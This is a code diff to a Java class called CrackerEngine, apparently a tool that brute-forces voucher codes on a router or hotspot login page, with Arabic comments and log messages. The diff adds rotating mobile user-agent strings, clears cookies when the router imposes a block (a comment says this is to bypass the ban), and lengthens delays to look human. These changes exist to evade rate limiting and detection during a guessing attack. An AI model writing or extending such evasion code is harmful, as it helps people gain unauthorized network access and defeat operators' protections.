@@ -8,6 +8,19 @@ import java.util.concurrent.atomic.*;
 import org.json.JSONObject;
 
 public class CrackerEngine {
+
+    private static final String[] USER_AGENTS = {
+        "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
+    };
+
+    private String ua() {
+        return USER_AGENTS[rng.nextInt(USER_AGENTS.length)];
+    }
+
     public interface Listener {
         void onLog(String msg);
         void onProgress(int cur, int total, String voucher);
@@ -138,7 +151,8 @@ public class CrackerEngine {
                 
                 if (r.busy) {
                     int waitSec = extractWaitTime(r.responseText);
-                    log("[W" + id + "]   🛑 حظر — الراوتر يطلب " + waitSec + " ثانية");
+                    log("[W" + id + "]   🛑 حظر — الراوتر يطلب " + waitSec + " ثانية (سيتم تغيير البصمة)");
+                    cookies.clear(); // مسح الكوكيز لتجاوز الحظر
                     int remaining = waitSec;
                     while (remaining > 0 && !found.get() && !stopped.get()) {
                         int chunk = Math.min(5, remaining);
@@ -163,7 +177,7 @@ public class CrackerEngine {
             // تحرير الجلسة
             logoutSession(cookies);
             cookies.clear();
-            sleep(100 + rng.nextInt(200));
+            sleep(1500 + rng.nextInt(1500)); // انتظار من 1.5 إلى 3 ثواني لمحاكاة البشر
         }
     }
 
